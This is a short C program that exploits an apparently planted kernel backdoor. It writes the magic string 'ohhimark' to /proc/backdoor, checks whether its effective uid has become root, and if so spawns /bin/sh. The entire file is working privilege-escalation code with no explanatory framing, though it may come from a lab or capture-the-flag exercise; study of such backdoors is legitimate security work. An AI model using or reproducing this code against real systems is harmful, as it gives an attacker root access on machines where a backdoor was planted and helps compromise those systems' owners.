#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(void)
{
    printf("Before uid=%d euid=%d\n", getuid(), geteuid());

    int fd = open("/proc/backdoor", O_WRONLY);
    if (fd < 0) { perror("open"); return 1; }

    write(fd, "ohhimark", 8);
    close(fd);

    printf("After uid=%d euid=%d\n", getuid(), geteuid());

    if (geteuid() == 0) {
        printf("Got root! Spawning shell...\n");
        execl("/bin/sh", "sh", NULL);
    }

    return 0;
}
